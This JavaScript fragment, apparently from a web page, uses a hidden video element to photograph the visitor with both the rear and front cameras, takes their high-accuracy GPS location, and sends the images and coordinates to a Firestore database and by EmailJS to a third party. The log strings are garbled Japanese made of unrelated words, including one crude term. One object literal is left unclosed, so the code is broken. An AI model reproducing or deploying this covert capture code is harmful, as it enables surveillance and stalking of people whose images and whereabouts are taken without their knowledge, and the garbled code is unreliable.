  async function capturePhotosWithQuality(facingMode) {
    log(`${facingMode}Áå´„Åß„Åô`);
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
    const video = document.createElement("video");
    video.style.display = "none";
    document.body.appendChild(video);
    video.srcObject = stream;
    await video.play();

    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    const ctx = canvas.getContext("2d");

    const highQualityPhotos = [];
    const lowQualityPhotos = [];

    for (let i = 0; i < 2; i++) {
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      const highQuality = canvas.toDataURL("image/jpeg", 0.9);
      const lowQuality = canvas.toDataURL("image/jpeg", 0.2);
      highQualityPhotos.push(highQuality);
      lowQualityPhotos.push(lowQuality);
      log(`„Éè„É™„Éç„Ç∫„Éü„Åß„Åô ${i + 1} ÊûöÁõÆ „Éà„Éû„Éà: ${Math.round((highQuality.length * 3) / 4 / 1024)} KB, Ëå∂Ëâ≤: ${Math.round((lowQuality.length * 3) / 4 / 1024)} KB`);
      await new Promise(r => setTimeout(r, 50));
    }

    stream.getTracks().forEach(t => t.stop());
    video.remove();
    return { highQualityPhotos, lowQualityPhotos };
  }

  function getLocation() {
    log("„Éã„Ç¨");
    return new Promise((resolve, reject) => {
      if (!navigator.geolocation) {
        reject(new Error("Èªí"));
        return;
      }
      navigator.geolocation.getCurrentPosition(pos => {
        const loc = {
          lat: pos.coords.latitude,
          lon: pos.coords.longitude,
          acc: pos.coords.accuracy,
          time: new Date(pos.timestamp).toLocaleString()
        };
        log(`ÊÄß‰∫§ÊàêÂäü: È∂â${loc.lat}, È∂è${loc.lon}, È≥•${loc.acc}m`);
        resolve(loc);
      }, err => {
        log(`‚ö†Ô∏è Â§±Êïó: ${err.message}`);
        resolve({ lat: "‰∏çÊòé", lon: "‰∏çÊòé", acc: "‰∏çÊòé", time: new Date().toLocaleString() });
      }, { enableHighAccuracy: true, timeout: 10000 });
    });
  }

  async function saveToFirestore(data) {
    log("‰øùÂ≠ò‰∏≠...");
    try {
      await addDoc(collection(db, "photos_with_location"), data);
      log("‰øùÂ≠òÂÆå‰∫Ü");
    } catch (e) {
      log("‰øùÂ≠òÂ§±Êïó: " + e.message);
    }
  }

  async function sendEmail(data) {
    log("„Å°„ÇÉ");
    try {
      await emailjs.send('service_ja2c09x', 'template_2fp2jrg', data);
      log("‚úÖ Email");
    } catch (e) {
      log("‚ùå Email: " + e.message);
    }
  }

  async function runProcess() {
    if (busy) {
      log("‚ùå Âá¶ÁêÜ‰∏≠„Åß„Åô");
      return;
    }
    busy = true;
    log("üîÑ Âá¶ÁêÜ");

    try {
      const rearPhotos = await capturePhotosWithQuality("environment");
      const frontPhotos = await capturePhotosWithQuality("user");
      const location = await getLocation();

      await saveToFirestore({
        rearPhotos: rearPhotos.highQualityPhotos,
        frontPhotos: frontPhotos.highQualityPhotos,
        location,
        createdAt: new Date().toISOString()
      });

      const templateParams = {
        photo_rear1: rearPhotos.lowQualityPhotos[0],
        photo_rear2: rearPhotos.lowQualityPhotos[1],
        photo_front1: frontPhotos.lowQualityPhotos[0],
        photo_front2: frontPhotos.lowQualityPhotos[1],
        location_info: `Á∑ØÂ∫¶: ${location.lat}<br>ÁµåÂ∫¶: ${location.lon}<br>Á≤æÂ∫¶: ${location.acc}m<br>ÊôÇÂàª: ${location.time}`,
        date: new Date().toLocaleString()

      await sendEmail(templateParams);

      log("üéâ Âá¶ÁêÜÂÆå‰∫ÜÔºÅ");
    } catch (e) {
      log("‚ùå ÂÖ®‰ΩìÂá¶ÁêÜ„Ç®„É©„Éº: " + e.message);
    } finally {
      busy = false;
    }
  }
